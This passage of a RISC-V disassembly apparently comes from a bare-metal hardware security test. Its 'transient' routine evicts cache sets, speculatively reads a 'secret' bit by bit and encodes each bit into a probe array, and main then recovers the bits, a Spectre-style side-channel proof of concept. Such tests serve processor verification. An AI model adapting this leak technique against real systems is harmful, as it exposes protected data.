    800089b8:	04813c23          	sd	s0,88(sp)
    800089bc:	06010413          	add	s0,sp,96
    800089c0:	00050793          	mv	a5,a0
    800089c4:	fab43823          	sd	a1,-80(s0)
    800089c8:	fac43423          	sd	a2,-88(s0)
    800089cc:	faf42e23          	sw	a5,-68(s0)
    800089d0:	fe042623          	sw	zero,-20(s0)
    800089d4:	0dc0006f          	j	80008ab0 <verifyDouble+0xfc>
    800089d8:	fec42783          	lw	a5,-20(s0)
    800089dc:	00379793          	sll	a5,a5,0x3
    800089e0:	fb043703          	ld	a4,-80(s0)
    800089e4:	00f707b3          	add	a5,a4,a5
    800089e8:	0007b787          	fld	fa5,0(a5)
    800089ec:	fef43027          	fsd	fa5,-32(s0)
    800089f0:	fec42783          	lw	a5,-20(s0)
    800089f4:	00178793          	add	a5,a5,1
    800089f8:	00379793          	sll	a5,a5,0x3
    800089fc:	fb043703          	ld	a4,-80(s0)
    80008a00:	00f707b3          	add	a5,a4,a5
    80008a04:	0007b787          	fld	fa5,0(a5)
    80008a08:	fcf43c27          	fsd	fa5,-40(s0)
    80008a0c:	fec42783          	lw	a5,-20(s0)
    80008a10:	00379793          	sll	a5,a5,0x3
    80008a14:	fa843703          	ld	a4,-88(s0)
    80008a18:	00f707b3          	add	a5,a4,a5
    80008a1c:	0007b787          	fld	fa5,0(a5)
    80008a20:	fcf43827          	fsd	fa5,-48(s0)
    80008a24:	fec42783          	lw	a5,-20(s0)
    80008a28:	00178793          	add	a5,a5,1
    80008a2c:	00379793          	sll	a5,a5,0x3
    80008a30:	fa843703          	ld	a4,-88(s0)
    80008a34:	00f707b3          	add	a5,a4,a5
    80008a38:	0007b787          	fld	fa5,0(a5)
    80008a3c:	fcf43427          	fsd	fa5,-56(s0)
    80008a40:	fe043707          	fld	fa4,-32(s0)
    80008a44:	fd043787          	fld	fa5,-48(s0)
    80008a48:	a2f727d3          	feq.d	a5,fa4,fa5
    80008a4c:	00f037b3          	snez	a5,a5
    80008a50:	0ff7f793          	zext.b	a5,a5
    80008a54:	fcf42223          	sw	a5,-60(s0)
    80008a58:	fd843707          	fld	fa4,-40(s0)
    80008a5c:	fc843787          	fld	fa5,-56(s0)
    80008a60:	a2f727d3          	feq.d	a5,fa4,fa5
    80008a64:	00f037b3          	snez	a5,a5
    80008a68:	0ff7f793          	zext.b	a5,a5
    80008a6c:	fcf42023          	sw	a5,-64(s0)
    80008a70:	fc442783          	lw	a5,-60(s0)
    80008a74:	00078713          	mv	a4,a5
    80008a78:	fc042783          	lw	a5,-64(s0)
    80008a7c:	00f777b3          	and	a5,a4,a5
    80008a80:	0007879b          	sext.w	a5,a5
    80008a84:	02079063          	bnez	a5,80008aa4 <verifyDouble+0xf0>
    80008a88:	fec42783          	lw	a5,-20(s0)
    80008a8c:	0017879b          	addw	a5,a5,1
    80008a90:	0007879b          	sext.w	a5,a5
    80008a94:	fc442703          	lw	a4,-60(s0)
    80008a98:	00f707bb          	addw	a5,a4,a5
    80008a9c:	0007879b          	sext.w	a5,a5
    80008aa0:	08c0006f          	j	80008b2c <verifyDouble+0x178>
    80008aa4:	fec42783          	lw	a5,-20(s0)
    80008aa8:	0027879b          	addw	a5,a5,2
    80008aac:	fef42623          	sw	a5,-20(s0)
    80008ab0:	fbc42783          	lw	a5,-68(s0)
    80008ab4:	01f7d71b          	srlw	a4,a5,0x1f
    80008ab8:	00f707bb          	addw	a5,a4,a5
    80008abc:	4017d79b          	sraw	a5,a5,0x1
    80008ac0:	0007879b          	sext.w	a5,a5
    80008ac4:	0017979b          	sllw	a5,a5,0x1
    80008ac8:	0007871b          	sext.w	a4,a5
    80008acc:	fec42783          	lw	a5,-20(s0)
    80008ad0:	0007879b          	sext.w	a5,a5
    80008ad4:	f0e7c2e3          	blt	a5,a4,800089d8 <verifyDouble+0x24>
    80008ad8:	fbc42783          	lw	a5,-68(s0)
    80008adc:	0017f793          	and	a5,a5,1
    80008ae0:	0007879b          	sext.w	a5,a5
    80008ae4:	04078263          	beqz	a5,80008b28 <verifyDouble+0x174>
    80008ae8:	fbc42783          	lw	a5,-68(s0)
    80008aec:	00379793          	sll	a5,a5,0x3
    80008af0:	ff878793          	add	a5,a5,-8
    80008af4:	fb043703          	ld	a4,-80(s0)
    80008af8:	00f707b3          	add	a5,a4,a5
    80008afc:	0007b707          	fld	fa4,0(a5)
    80008b00:	fbc42783          	lw	a5,-68(s0)
    80008b04:	00379793          	sll	a5,a5,0x3
    80008b08:	ff878793          	add	a5,a5,-8
    80008b0c:	fa843703          	ld	a4,-88(s0)
    80008b10:	00f707b3          	add	a5,a4,a5
    80008b14:	0007b787          	fld	fa5,0(a5)
    80008b18:	a2f727d3          	feq.d	a5,fa4,fa5
    80008b1c:	00079663          	bnez	a5,80008b28 <verifyDouble+0x174>
    80008b20:	fbc42783          	lw	a5,-68(s0)
    80008b24:	0080006f          	j	80008b2c <verifyDouble+0x178>
    80008b28:	00000793          	li	a5,0
    80008b2c:	00078513          	mv	a0,a5
    80008b30:	05813403          	ld	s0,88(sp)
    80008b34:	06010113          	add	sp,sp,96
    80008b38:	00008067          	ret

0000000080008b3c <barrier>:
    80008b3c:	fe010113          	add	sp,sp,-32
    80008b40:	00813c23          	sd	s0,24(sp)
    80008b44:	02010413          	add	s0,sp,32
    80008b48:	00050793          	mv	a5,a0
    80008b4c:	fef42623          	sw	a5,-20(s0)
    80008b50:	0ff0000f          	fence
    80008b54:	08422783          	lw	a5,132(tp) # 84 <threadsense.2>
    80008b58:	0017b793          	seqz	a5,a5
    80008b5c:	0ff7f793          	zext.b	a5,a5
    80008b60:	0007871b          	sext.w	a4,a5
    80008b64:	08e22223          	sw	a4,132(tp) # 84 <threadsense.2>
    80008b68:	ffffd797          	auipc	a5,0xffffd
    80008b6c:	49878793          	add	a5,a5,1176 # 80006000 <count.1>
    80008b70:	00100713          	li	a4,1
    80008b74:	0f50000f          	fence	iorw,ow
    80008b78:	04e7a6af          	amoadd.w.aq	a3,a4,(a5)
    80008b7c:	0006879b          	sext.w	a5,a3
    80008b80:	0007871b          	sext.w	a4,a5
    80008b84:	fec42783          	lw	a5,-20(s0)
    80008b88:	fff7879b          	addw	a5,a5,-1
    80008b8c:	0007879b          	sext.w	a5,a5
    80008b90:	02f71263          	bne	a4,a5,80008bb4 <barrier+0x78>
    80008b94:	ffffd797          	auipc	a5,0xffffd
    80008b98:	46c78793          	add	a5,a5,1132 # 80006000 <count.1>
    80008b9c:	0007a023          	sw	zero,0(a5)
    80008ba0:	08422703          	lw	a4,132(tp) # 84 <threadsense.2>
    80008ba4:	ffffd797          	auipc	a5,0xffffd
    80008ba8:	46078793          	add	a5,a5,1120 # 80006004 <sense.0>
    80008bac:	00e7a023          	sw	a4,0(a5)
    80008bb0:	0200006f          	j	80008bd0 <barrier+0x94>
    80008bb4:	00000013          	nop
    80008bb8:	ffffd797          	auipc	a5,0xffffd
    80008bbc:	44c78793          	add	a5,a5,1100 # 80006004 <sense.0>
    80008bc0:	0007a783          	lw	a5,0(a5)
    80008bc4:	0007871b          	sext.w	a4,a5
    80008bc8:	08422783          	lw	a5,132(tp) # 84 <threadsense.2>
    80008bcc:	fef716e3          	bne	a4,a5,80008bb8 <barrier+0x7c>
    80008bd0:	0ff0000f          	fence
    80008bd4:	00000013          	nop
    80008bd8:	01813403          	ld	s0,24(sp)
    80008bdc:	02010113          	add	sp,sp,32
    80008be0:	00008067          	ret

0000000080008be4 <lfsr>:
    80008be4:	fd010113          	add	sp,sp,-48
    80008be8:	02813423          	sd	s0,40(sp)
    80008bec:	03010413          	add	s0,sp,48
    80008bf0:	fca43c23          	sd	a0,-40(s0)
    80008bf4:	fd843783          	ld	a5,-40(s0)
    80008bf8:	0017d713          	srl	a4,a5,0x1
    80008bfc:	fd843783          	ld	a5,-40(s0)
    80008c00:	00f747b3          	xor	a5,a4,a5
    80008c04:	0017f793          	and	a5,a5,1
    80008c08:	fef43423          	sd	a5,-24(s0)
    80008c0c:	fd843783          	ld	a5,-40(s0)
    80008c10:	0017d713          	srl	a4,a5,0x1
    80008c14:	fe843783          	ld	a5,-24(s0)
    80008c18:	03e79793          	sll	a5,a5,0x3e
    80008c1c:	00f767b3          	or	a5,a4,a5
    80008c20:	00078513          	mv	a0,a5
    80008c24:	02813403          	ld	s0,40(sp)
    80008c28:	03010113          	add	sp,sp,48
    80008c2c:	00008067          	ret

0000000080008c30 <lfsr10>:
    80008c30:	fd010113          	add	sp,sp,-48
    80008c34:	02813423          	sd	s0,40(sp)
    80008c38:	03010413          	add	s0,sp,48
    80008c3c:	fca43c23          	sd	a0,-40(s0)
    80008c40:	fd843783          	ld	a5,-40(s0)
    80008c44:	00a7d713          	srl	a4,a5,0xa
    80008c48:	fd843783          	ld	a5,-40(s0)
    80008c4c:	00f747b3          	xor	a5,a4,a5
    80008c50:	3ff7f793          	and	a5,a5,1023
    80008c54:	fef43423          	sd	a5,-24(s0)
    80008c58:	fd843783          	ld	a5,-40(s0)
    80008c5c:	00a7d713          	srl	a4,a5,0xa
    80008c60:	fe843783          	ld	a5,-24(s0)
    80008c64:	03579793          	sll	a5,a5,0x35
    80008c68:	00f767b3          	or	a5,a4,a5
    80008c6c:	00078513          	mv	a0,a5
    80008c70:	02813403          	ld	s0,40(sp)
    80008c74:	03010113          	add	sp,sp,48
    80008c78:	00008067          	ret

0000000080008c7c <transient>:
    80008c7c:	fe010113          	add	sp,sp,-32
    80008c80:	00813c23          	sd	s0,24(sp)
    80008c84:	02010413          	add	s0,sp,32
    80008c88:	fea43423          	sd	a0,-24(s0)
    80008c8c:	12000073          	sfence.vma
    80008c90:	005f7597          	auipc	a1,0x5f7
    80008c94:	3b058593          	add	a1,a1,944 # 80600040 <conflict+0x40>
    80008c98:	0005b603          	ld	a2,0(a1)
    80008c9c:	005f8597          	auipc	a1,0x5f8
    80008ca0:	3a458593          	add	a1,a1,932 # 80601040 <conflict1+0x40>
    80008ca4:	0005b603          	ld	a2,0(a1)
    80008ca8:	005f9597          	auipc	a1,0x5f9
    80008cac:	39858593          	add	a1,a1,920 # 80602040 <conflict2+0x40>
    80008cb0:	0005b603          	ld	a2,0(a1)
    80008cb4:	005fa597          	auipc	a1,0x5fa
    80008cb8:	38c58593          	add	a1,a1,908 # 80603040 <conflict3+0x40>
    80008cbc:	0005b603          	ld	a2,0(a1)
    80008cc0:	005fb597          	auipc	a1,0x5fb
    80008cc4:	38058593          	add	a1,a1,896 # 80604040 <conflict4+0x40>
    80008cc8:	0005b603          	ld	a2,0(a1)
    80008ccc:	005fc597          	auipc	a1,0x5fc
    80008cd0:	37458593          	add	a1,a1,884 # 80605040 <conflict5+0x40>
    80008cd4:	0005b603          	ld	a2,0(a1)
    80008cd8:	005fd597          	auipc	a1,0x5fd
    80008cdc:	36858593          	add	a1,a1,872 # 80606040 <conflict6+0x40>
    80008ce0:	0005b603          	ld	a2,0(a1)
    80008ce4:	005fe597          	auipc	a1,0x5fe
    80008ce8:	35c58593          	add	a1,a1,860 # 80607040 <conflict7+0x40>
    80008cec:	0005b603          	ld	a2,0(a1)
    80008cf0:	0ff0000f          	fence
    80008cf4:	00000197          	auipc	gp,0x0
    80008cf8:	05c18193          	add	gp,gp,92 # 80008d50 <transient+0xd4>
    80008cfc:	003f7797          	auipc	a5,0x3f7
    80008d00:	30478793          	add	a5,a5,772 # 80400000 <data>
    80008d04:	003f9597          	auipc	a1,0x3f9
    80008d08:	2fc58593          	add	a1,a1,764 # 80402000 <data2>
    80008d0c:	007f7717          	auipc	a4,0x7f7
    80008d10:	2f470713          	add	a4,a4,756 # 80800000 <secret>
    80008d14:	10000613          	li	a2,256
    80008d18:	00200693          	li	a3,2
    80008d1c:	d036f753          	fcvt.s.lu	fa4,a3
    80008d20:	d03677d3          	fcvt.s.lu	fa5,a2
    80008d24:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80008d28:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80008d2c:	c037f653          	fcvt.lu.s	a2,fa5
    80008d30:	00c585b3          	add	a1,a1,a2
    80008d34:	0005b603          	ld	a2,0(a1)
    80008d38:	00073683          	ld	a3,0(a4)
    80008d3c:	00a6d6b3          	srl	a3,a3,a0
    80008d40:	0016f693          	and	a3,a3,1
    80008d44:	00c69693          	sll	a3,a3,0xc
    80008d48:	00d787b3          	add	a5,a5,a3
    80008d4c:	0007b783          	ld	a5,0(a5)
    80008d50:	00000193          	li	gp,0
    80008d54:	00000013          	nop
    80008d58:	01813403          	ld	s0,24(sp)
    80008d5c:	02010113          	add	sp,sp,32
    80008d60:	00008067          	ret

0000000080008d64 <main>:
    80008d64:	f7010113          	add	sp,sp,-144
    80008d68:	08113423          	sd	ra,136(sp)
    80008d6c:	08813023          	sd	s0,128(sp)
    80008d70:	09010413          	add	s0,sp,144
    80008d74:	37ab77b7          	lui	a5,0x37ab7
    80008d78:	00279793          	sll	a5,a5,0x2
    80008d7c:	eef78793          	add	a5,a5,-273 # 37ab6eef <threadsense.2+0x37ab6e6b>
    80008d80:	fcf43c23          	sd	a5,-40(s0)
    80008d84:	f8043c23          	sd	zero,-104(s0)
    80008d88:	fa043023          	sd	zero,-96(s0)
    80008d8c:	fa043423          	sd	zero,-88(s0)
    80008d90:	fa043823          	sd	zero,-80(s0)
    80008d94:	f6043c23          	sd	zero,-136(s0)
    80008d98:	f8043023          	sd	zero,-128(s0)
    80008d9c:	f8043423          	sd	zero,-120(s0)
    80008da0:	f8043823          	sd	zero,-112(s0)
    80008da4:	01f00793          	li	a5,31
    80008da8:	fef42623          	sw	a5,-20(s0)
    80008dac:	0fc0006f          	j	80008ea8 <main+0x144>
    80008db0:	f6043823          	sd	zero,-144(s0)
    80008db4:	fe042423          	sw	zero,-24(s0)
    80008db8:	02c0006f          	j	80008de4 <main+0x80>
    80008dbc:	fec42783          	lw	a5,-20(s0)
    80008dc0:	00078513          	mv	a0,a5
    80008dc4:	eb9ff0ef          	jal	80008c7c <transient>
    80008dc8:	003f7797          	auipc	a5,0x3f7
    80008dcc:	23878793          	add	a5,a5,568 # 80400000 <data>
    80008dd0:	0407c783          	lbu	a5,64(a5)
    80008dd4:	faf43c23          	sd	a5,-72(s0)
    80008dd8:	fe842783          	lw	a5,-24(s0)
    80008ddc:	0017879b          	addw	a5,a5,1
    80008de0:	fef42423          	sw	a5,-24(s0)
    80008de4:	fe842783          	lw	a5,-24(s0)
    80008de8:	0007879b          	sext.w	a5,a5
    80008dec:	fcf058e3          	blez	a5,80008dbc <main+0x58>
    80008df0:	fe042223          	sw	zero,-28(s0)
    80008df4:	fe042023          	sw	zero,-32(s0)
    80008df8:	0380006f          	j	80008e30 <main+0xcc>
    80008dfc:	fe042783          	lw	a5,-32(s0)
    80008e00:	00379793          	sll	a5,a5,0x3
    80008e04:	ff078793          	add	a5,a5,-16
    80008e08:	008787b3          	add	a5,a5,s0
    80008e0c:	f807b703          	ld	a4,-128(a5)
    80008e10:	04100793          	li	a5,65
    80008e14:	00e7f863          	bgeu	a5,a4,80008e24 <main+0xc0>
    80008e18:	fe442783          	lw	a5,-28(s0)
    80008e1c:	0017879b          	addw	a5,a5,1
    80008e20:	fef42223          	sw	a5,-28(s0)
    80008e24:	fe042783          	lw	a5,-32(s0)
    80008e28:	0017879b          	addw	a5,a5,1
    80008e2c:	fef42023          	sw	a5,-32(s0)
    80008e30:	fe042783          	lw	a5,-32(s0)
    80008e34:	0007879b          	sext.w	a5,a5
    80008e38:	fcf052e3          	blez	a5,80008dfc <main+0x98>
    80008e3c:	fe442783          	lw	a5,-28(s0)
    80008e40:	0007879b          	sext.w	a5,a5
    80008e44:	00f027b3          	sgtz	a5,a5
    80008e48:	0ff7f793          	zext.b	a5,a5
    80008e4c:	00078713          	mv	a4,a5
    80008e50:	fec42783          	lw	a5,-20(s0)
    80008e54:	ff078793          	add	a5,a5,-16
    80008e58:	008787b3          	add	a5,a5,s0
    80008e5c:	fae78423          	sb	a4,-88(a5)
    80008e60:	fe442783          	lw	a5,-28(s0)
    80008e64:	0007879b          	sext.w	a5,a5
    80008e68:	00f04e63          	bgtz	a5,80008e84 <main+0x120>
    80008e6c:	fe442783          	lw	a5,-28(s0)
    80008e70:	0ff7f793          	zext.b	a5,a5
    80008e74:	00100713          	li	a4,1
    80008e78:	40f707bb          	subw	a5,a4,a5
    80008e7c:	0ff7f793          	zext.b	a5,a5
    80008e80:	00c0006f          	j	80008e8c <main+0x128>
    80008e84:	fe442783          	lw	a5,-28(s0)
    80008e88:	0ff7f793          	zext.b	a5,a5
    80008e8c:	fec42703          	lw	a4,-20(s0)
    80008e90:	ff070713          	add	a4,a4,-16
    80008e94:	00870733          	add	a4,a4,s0
    80008e98:	f8f70423          	sb	a5,-120(a4)
    80008e9c:	fec42783          	lw	a5,-20(s0)
    80008ea0:	fff7879b          	addw	a5,a5,-1
    80008ea4:	fef42623          	sw	a5,-20(s0)
    80008ea8:	fec42783          	lw	a5,-20(s0)
    80008eac:	0007879b          	sext.w	a5,a5
    80008eb0:	f007d0e3          	bgez	a5,80008db0 <main+0x4c>
    80008eb4:	600007b7          	lui	a5,0x60000
    80008eb8:	fcf43823          	sd	a5,-48(s0)
    80008ebc:	600007b7          	lui	a5,0x60000
    80008ec0:	01078793          	add	a5,a5,16 # 60000010 <threadsense.2+0x5fffff8c>
    80008ec4:	fcf43423          	sd	a5,-56(s0)
    80008ec8:	fc0403a3          	sb	zero,-57(s0)
    80008ecc:	fc843783          	ld	a5,-56(s0)
    80008ed0:	fc744703          	lbu	a4,-57(s0)
    80008ed4:	00e78023          	sb	a4,0(a5)
    80008ed8:	0ff0000f          	fence
    80008edc:	fd043783          	ld	a5,-48(s0)
    80008ee0:	00078023          	sb	zero,0(a5)
    80008ee4:	00000793          	li	a5,0
    80008ee8:	00078513          	mv	a0,a5
    80008eec:	08813083          	ld	ra,136(sp)
    80008ef0:	08013403          	ld	s0,128(sp)
    80008ef4:	09010113          	add	sp,sp,144
    80008ef8:	00008067          	ret

Disassembly of section .text.attack:

0000000080200000 <attack>:
    80200000:	ffe09097          	auipc	ra,0xffe09
    80200004:	d64080e7          	jalr	-668(ra) # 80008d64 <main>

0000000080200008 <attack_end>:
    80200008:	ffe00297          	auipc	t0,0xffe00
    8020000c:	01428293          	add	t0,t0,20 # 8000001c <stvec_handler>
    80200010:	00028067          	jr	t0

Disassembly of section .rodata:

0000000080200018 <.rodata>:
    80200018:	6e28                	.2byte	0x6e28
    8020001a:	6c75                	.2byte	0x6c75
    8020001c:	296c                	.2byte	0x296c
    8020001e:	0000                	.2byte	0x0
    80200020:	7c38                	.2byte	0x7c38
    80200022:	ffe0                	.2byte	0xffe0
    80200024:	7e98                	.2byte	0x7e98
    80200026:	ffe0                	.2byte	0xffe0
    80200028:	7e84                	.2byte	0x7e84
    8020002a:	ffe0                	.2byte	0xffe0
    8020002c:	7e98                	.2byte	0x7e98
    8020002e:	ffe0                	.2byte	0xffe0
    80200030:	7e98                	.2byte	0x7e98
    80200032:	ffe0                	.2byte	0xffe0
    80200034:	7e98                	.2byte	0x7e98
    80200036:	ffe0                	.2byte	0xffe0
    80200038:	7e98                	.2byte	0x7e98
    8020003a:	ffe0                	.2byte	0xffe0
    8020003c:	7c0c                	.2byte	0x7c0c
    8020003e:	ffe0                	.2byte	0xffe0
    80200040:	7e98                	.2byte	0x7e98
    80200042:	ffe0                	.2byte	0xffe0
    80200044:	7e98                	.2byte	0x7e98
    80200046:	ffe0                	.2byte	0xffe0
    80200048:	7b90                	.2byte	0x7b90
    8020004a:	ffe0                	.2byte	0xffe0
    8020004c:	7c24                	.2byte	0x7c24
    8020004e:	ffe0                	.2byte	0xffe0
    80200050:	7e98                	.2byte	0x7e98
    80200052:	ffe0                	.2byte	0xffe0
    80200054:	7b9c                	.2byte	0x7b9c
    80200056:	ffe0                	.2byte	0xffe0
    80200058:	7ba8                	.2byte	0x7ba8
    8020005a:	ffe0                	.2byte	0xffe0
    8020005c:	7ba8                	.2byte	0x7ba8
    8020005e:	ffe0                	.2byte	0xffe0
    80200060:	7ba8                	.2byte	0x7ba8
    80200062:	ffe0                	.2byte	0xffe0
    80200064:	7ba8                	.2byte	0x7ba8
    80200066:	ffe0                	.2byte	0xffe0
    80200068:	7ba8                	.2byte	0x7ba8
    8020006a:	ffe0                	.2byte	0xffe0
    8020006c:	7ba8                	.2byte	0x7ba8
    8020006e:	ffe0                	.2byte	0xffe0
    80200070:	7ba8                	.2byte	0x7ba8
    80200072:	ffe0                	.2byte	0xffe0
    80200074:	7ba8                	.2byte	0x7ba8
    80200076:	ffe0                	.2byte	0xffe0
    80200078:	7ba8                	.2byte	0x7ba8
    8020007a:	ffe0                	.2byte	0xffe0
    8020007c:	7e98                	.2byte	0x7e98
    8020007e:	ffe0                	.2byte	0xffe0
    80200080:	7e98                	.2byte	0x7e98
    80200082:	ffe0                	.2byte	0xffe0
    80200084:	7e98                	.2byte	0x7e98
    80200086:	ffe0                	.2byte	0xffe0
    80200088:	7e98                	.2byte	0x7e98
    8020008a:	ffe0                	.2byte	0xffe0
    8020008c:	7e98                	.2byte	0x7e98
    8020008e:	ffe0                	.2byte	0xffe0
    80200090:	7e98                	.2byte	0x7e98
    80200092:	ffe0                	.2byte	0xffe0
    80200094:	7e98                	.2byte	0x7e98
    80200096:	ffe0                	.2byte	0xffe0
    80200098:	7e98                	.2byte	0x7e98
    8020009a:	ffe0                	.2byte	0xffe0
    8020009c:	7e98                	.2byte	0x7e98
    8020009e:	ffe0                	.2byte	0xffe0
    802000a0:	7e98                	.2byte	0x7e98
    802000a2:	ffe0                	.2byte	0xffe0
    802000a4:	7e98                	.2byte	0x7e98
    802000a6:	ffe0                	.2byte	0xffe0
    802000a8:	7e98                	.2byte	0x7e98
    802000aa:	ffe0                	.2byte	0xffe0
    802000ac:	7e98                	.2byte	0x7e98
    802000ae:	ffe0                	.2byte	0xffe0
    802000b0:	7e98                	.2byte	0x7e98
    802000b2:	ffe0                	.2byte	0xffe0
    802000b4:	7e98                	.2byte	0x7e98
    802000b6:	ffe0                	.2byte	0xffe0
    802000b8:	7e98                	.2byte	0x7e98
    802000ba:	ffe0                	.2byte	0xffe0
    802000bc:	7e98                	.2byte	0x7e98
    802000be:	ffe0                	.2byte	0xffe0
    802000c0:	7e98                	.2byte	0x7e98
    802000c2:	ffe0                	.2byte	0xffe0
    802000c4:	7e98                	.2byte	0x7e98
    802000c6:	ffe0                	.2byte	0xffe0
    802000c8:	7e98                	.2byte	0x7e98
    802000ca:	ffe0                	.2byte	0xffe0
    802000cc:	7e98                	.2byte	0x7e98
    802000ce:	ffe0                	.2byte	0xffe0
    802000d0:	7e98                	.2byte	0x7e98
    802000d2:	ffe0                	.2byte	0xffe0
    802000d4:	7e98                	.2byte	0x7e98
    802000d6:	ffe0                	.2byte	0xffe0
    802000d8:	7e98                	.2byte	0x7e98
    802000da:	ffe0                	.2byte	0xffe0
    802000dc:	7e98                	.2byte	0x7e98
    802000de:	ffe0                	.2byte	0xffe0
    802000e0:	7e98                	.2byte	0x7e98
    802000e2:	ffe0                	.2byte	0xffe0
    802000e4:	7e98                	.2byte	0x7e98
    802000e6:	ffe0                	.2byte	0xffe0
    802000e8:	7e98                	.2byte	0x7e98
    802000ea:	ffe0                	.2byte	0xffe0
    802000ec:	7e98                	.2byte	0x7e98
    802000ee:	ffe0                	.2byte	0xffe0
    802000f0:	7e98                	.2byte	0x7e98
    802000f2:	ffe0                	.2byte	0xffe0
    802000f4:	7e98                	.2byte	0x7e98
    802000f6:	ffe0                	.2byte	0xffe0
    802000f8:	7e98                	.2byte	0x7e98
    802000fa:	ffe0                	.2byte	0xffe0
    802000fc:	7e98                	.2byte	0x7e98
    802000fe:	ffe0                	.2byte	0xffe0
    80200100:	7e98                	.2byte	0x7e98
    80200102:	ffe0                	.2byte	0xffe0
    80200104:	7e98                	.2byte	0x7e98
    80200106:	ffe0                	.2byte	0xffe0
    80200108:	7e98                	.2byte	0x7e98
    8020010a:	ffe0                	.2byte	0xffe0
    8020010c:	7e98                	.2byte	0x7e98
    8020010e:	ffe0                	.2byte	0xffe0
    80200110:	7e98                	.2byte	0x7e98
    80200112:	ffe0                	.2byte	0xffe0
    80200114:	7e98                	.2byte	0x7e98
    80200116:	ffe0                	.2byte	0xffe0
    80200118:	7e98                	.2byte	0x7e98
    8020011a:	ffe0                	.2byte	0xffe0
    8020011c:	7e98                	.2byte	0x7e98
    8020011e:	ffe0                	.2byte	0xffe0
    80200120:	7c78                	.2byte	0x7c78
    80200122:	ffe0                	.2byte	0xffe0
    80200124:	7db4                	.2byte	0x7db4
    80200126:	ffe0                	.2byte	0xffe0
    80200128:	7e98                	.2byte	0x7e98
    8020012a:	ffe0                	.2byte	0xffe0
    8020012c:	7e98                	.2byte	0x7e98
    8020012e:	ffe0                	.2byte	0xffe0
    80200130:	7e98                	.2byte	0x7e98
    80200132:	ffe0                	.2byte	0xffe0
    80200134:	7e98                	.2byte	0x7e98
    80200136:	ffe0                	.2byte	0xffe0
    80200138:	7e98                	.2byte	0x7e98
    8020013a:	ffe0                	.2byte	0xffe0
    8020013c:	7e98                	.2byte	0x7e98
    8020013e:	ffe0                	.2byte	0xffe0
    80200140:	7e98                	.2byte	0x7e98
    80200142:	ffe0                	.2byte	0xffe0
    80200144:	7c68                	.2byte	0x7c68
    80200146:	ffe0                	.2byte	0xffe0
    80200148:	7e98                	.2byte	0x7e98
    8020014a:	ffe0                	.2byte	0xffe0
    8020014c:	7e98                	.2byte	0x7e98
    8020014e:	ffe0                	.2byte	0xffe0
    80200150:	7e0c                	.2byte	0x7e0c
    80200152:	ffe0                	.2byte	0xffe0
    80200154:	7e18                	.2byte	0x7e18
    80200156:	ffe0                	.2byte	0xffe0
    80200158:	7e98                	.2byte	0x7e98
    8020015a:	ffe0                	.2byte	0xffe0
    8020015c:	7e98                	.2byte	0x7e98
    8020015e:	ffe0                	.2byte	0xffe0
    80200160:	7c9c                	.2byte	0x7c9c
    80200162:	ffe0                	.2byte	0xffe0
    80200164:	7e98                	.2byte	0x7e98
    80200166:	ffe0                	.2byte	0xffe0
    80200168:	7e00                	.2byte	0x7e00
    8020016a:	ffe0                	.2byte	0xffe0
    8020016c:	7e98                	.2byte	0x7e98
    8020016e:	ffe0                	.2byte	0xffe0
    80200170:	7e98                	.2byte	0x7e98
    80200172:	ffe0                	.2byte	0xffe0
    80200174:	7e40                	.2byte	0x7e40
    80200176:	ffe0                	.2byte	0xffe0

Disassembly of section .data:

0000000080400000 <data>:
    80400000:	0100                	.2byte	0x100
    80400002:	0302                	.2byte	0x302
    80400004:	0504                	.2byte	0x504
    80400006:	0706                	.2byte	0x706
    80400008:	0908                	.2byte	0x908
    8040000a:	0b0a                	.2byte	0xb0a
    8040000c:	0d0c                	.2byte	0xd0c
    8040000e:	0f0e                	.2byte	0xf0e
    80400010:	1110                	.2byte	0x1110
    80400012:	1312                	.2byte	0x1312
    80400014:	1514                	.2byte	0x1514
    80400016:	1716                	.2byte	0x1716
    80400018:	1918                	.2byte	0x1918
    8040001a:	1b1a                	.2byte	0x1b1a
    8040001c:	1d1c                	.2byte	0x1d1c
    8040001e:	1f1e                	.2byte	0x1f1e
    80400020:	2120                	.2byte	0x2120
    80400022:	2322                	.2byte	0x2322
    80400024:	2524                	.2byte	0x2524
    80400026:	2726                	.2byte	0x2726
    80400028:	2928                	.2byte	0x2928
    8040002a:	2b2a                	.2byte	0x2b2a
    8040002c:	2d2c                	.2byte	0x2d2c
    8040002e:	2f2e                	.2byte	0x2f2e
    80400030:	3130                	.2byte	0x3130
    80400032:	3332                	.2byte	0x3332
    80400034:	3534                	.2byte	0x3534
    80400036:	3736                	.2byte	0x3736
    80400038:	3938                	.2byte	0x3938
    8040003a:	3b3a                	.2byte	0x3b3a
    8040003c:	3d3c                	.2byte	0x3d3c
    8040003e:	3f3e                	.2byte	0x3f3e
    80400040:	4140                	.2byte	0x4140
    80400042:	4342                	.2byte	0x4342
    80400044:	4544                	.2byte	0x4544
    80400046:	4746                	.2byte	0x4746
    80400048:	4948                	.2byte	0x4948
    8040004a:	4b4a                	.2byte	0x4b4a
    8040004c:	4d4c                	.2byte	0x4d4c
    8040004e:	4f4e                	.2byte	0x4f4e
    80400050:	5150                	.2byte	0x5150
    80400052:	5352                	.2byte	0x5352
    80400054:	5554                	.2byte	0x5554
    80400056:	5756                	.2byte	0x5756
    80400058:	5958                	.2byte	0x5958
    8040005a:	5b5a                	.2byte	0x5b5a
    8040005c:	5d5c                	.2byte	0x5d5c
    8040005e:	5f5e                	.2byte	0x5f5e
    80400060:	6160                	.2byte	0x6160
    80400062:	6362                	.2byte	0x6362
    80400064:	6564                	.2byte	0x6564
    80400066:	6766                	.2byte	0x6766
    80400068:	6968                	.2byte	0x6968
    8040006a:	6b6a                	.2byte	0x6b6a
    8040006c:	6d6c                	.2byte	0x6d6c
    8040006e:	6f6e                	.2byte	0x6f6e
    80400070:	7170                	.2byte	0x7170
    80400072:	7372                	.2byte	0x7372
    80400074:	7574                	.2byte	0x7574
    80400076:	7776                	.2byte	0x7776
    80400078:	7978                	.2byte	0x7978
    8040007a:	7b7a                	.2byte	0x7b7a
    8040007c:	7d7c                	.2byte	0x7d7c
    8040007e:	7f7e                	.2byte	0x7f7e
	...

0000000080401000 <data1>:
    80401000:	0100                	.2byte	0x100
    80401002:	0302                	.2byte	0x302
    80401004:	0504                	.2byte	0x504
    80401006:	0706                	.2byte	0x706
    80401008:	0908                	.2byte	0x908
    8040100a:	0b0a                	.2byte	0xb0a
    8040100c:	0d0c                	.2byte	0xd0c
    8040100e:	0f0e                	.2byte	0xf0e
    80401010:	1110                	.2byte	0x1110
    80401012:	1312                	.2byte	0x1312
